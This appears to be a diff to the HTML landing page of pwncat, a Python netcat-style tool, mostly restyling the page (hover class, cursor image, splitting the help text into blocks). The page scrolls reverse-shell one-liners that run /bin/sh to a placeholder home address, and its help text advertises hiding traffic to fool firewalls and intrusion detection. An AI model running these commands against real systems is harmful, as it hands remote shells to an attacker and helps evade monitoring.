@@ -6,11 +6,12 @@
 	<meta name="description" content="Enhanced netcat implementation in Python.">
 	<title>pwncat</title>
 	<style>
-	body {background-color: #000; color:#006400;font-size: 15px;}
+	body {background-color: #000; color:#006400;font-size: 15px; cursor: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/9632/happy.png"), auto;}
 	a:link, a:visited, a:active {color: #006400;}
 	a:hover {color: #00FF00;}
 	h1 {font-size:144px; margin:0; padding:0}
 	h1:hover {color: #00FF00;}
+	.hi:hover {color: #00FF00;}
 	ul {margin-top:50px;}
 	li {list-style-type: none; margin:15px; font-size:46px;}
 	#wrapper {overflow: hidden;display: flex;}
@@ -21,10 +22,10 @@
 <body>
 	<!-- I really suck at HTML, would be my please if you PR-clean this and make it even more oldschool ;-) -->
 	<marquee behavior="alternate">
-		<code>pwncat -n -e /bin/sh {home-addr} {home-port}</code> ##########
-		<code>pwncat -n --recon 0 --recon-robin 4000-4100 -e /bin/sh {home-addr} {home-port}</code> ##########
-		<code>pwncat -n --udp --udp-ping-intvl 30 -e /bin/sh {home-addr} {home-port}</code> ##########
-		<code>pwncat -n --safe-word 'all your base are belong to us' --udp --udp-ping-intvl 30 -e /bin/sh {home-addr} {home-port}</code>
+		<code class="hi">pwncat -n -e /bin/sh {home-addr} {home-port}</code> ##########
+		<code class="hi">pwncat -n --recon 0 --recon-robin 4000-4100 -e /bin/sh {home-addr} {home-port}</code> ##########
+		<code class="hi">pwncat -n --udp --udp-ping-intvl 30 -e /bin/sh {home-addr} {home-port}</code> ##########
+		<code class="hi">pwncat -n --safe-word 'all your base are belong to us' --udp --udp-ping-intvl 30 -e /bin/sh {home-addr} {home-port}</code>
 	</marquee>
 	<div id="wrapper">
 		<div id="left">
@@ -35,19 +36,19 @@
 			</ul>
 		</div>
 		<div id="right">
-			<marquee direction="down" width="450" height="200" behavior="alternate">
+			<marquee direction="down" width="455" height="200" behavior="alternate">
 			  <marquee behavior="alternate">
 				<h1>pwncat</h1>
 			  </marquee>
 			</marquee>
-			<p><pre><code>
+			<p><pre><code class="hi">
 usage: pwncat [-Cnuv] [-e cmd] hostname port
        pwncat [-Cnuv] [-e cmd] -l [hostname] port
        pwncat [-Cnuv] -z hostname port
        pwncat [-Cnuv] -L addr:port [hostname] port
        pwncat -V, --version
-       pwncat -h, --help
-
+       pwncat -h, --help</code></pre>
+<pre class="hi"><code>
 
 Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
 connect, zero-i/o, listen and forward modes and techniques to detect and evade
@@ -57,11 +58,15 @@ If no mode arguments are specified, pwncat will run in connect mode and act as
 a client to connect to a remote endpoint. If the connection to the remote
 endoint is lost, pwncat will quit. See advanced options for how to automatically
 reconnect.
+</code></pre>
 
+<pre class="hi"><code>
 positional arguments:
   hostname              Address to listen, forward or connect to
   port                  Port to listen, forward or connect to
 
+</code></pre>
+<pre class="hi"><code>
 mode arguments:
   -l, --listen          [Listen mode]:
                         Start a server and listen for incoming connections.
@@ -83,6 +88,8 @@ mode arguments:
                         address given via -L/--local addr:port.
                         (I.e.: proxies a remote service to a local address)
 
+</code></pre>
+<pre class="hi"><code>
 optional arguments:
   -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
   -C, --crlf            Send CRLF line-endings in connect mode (default: LF)
@@ -92,6 +99,8 @@ optional arguments:
                         or -vvvv for more verbosity. The server performance will
                         decrease drastically if you use more than three times.
 
+</code></pre>
+<pre class="hi"><code>
 advanced arguments:
   --http                Connect / Listen / Local forward mode (TCP only):
                         Hide traffic in http packets to fool Firewalls/IDS/IPS.
@@ -196,6 +205,8 @@ advanced arguments:
                         Use a very unique string to not have it shut down
                         accidentally by other input.
 
+</code></pre>
+<pre class="hi"><code>
 misc arguments:
   -h, --help            Show this help message and exit
   -V, --version         Show version information and exit
